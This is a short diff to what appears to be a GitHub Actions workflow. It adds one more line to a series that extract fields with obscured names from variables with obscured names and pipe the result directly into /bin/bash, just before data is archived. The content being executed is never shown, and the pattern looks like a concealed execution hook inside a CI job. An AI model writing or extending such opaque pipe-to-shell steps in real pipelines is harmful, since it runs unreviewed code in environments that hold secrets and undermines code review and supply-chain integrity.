@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$nh21536" | jq -r .t72 | /bin/bash
           echo $l986 | jq -r .suhc2 | /bin/bash
           echo $koaz1939 | jq -r .mttu2 | /bin/bash
+          echo $brtx1 | jq -r .y73876 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
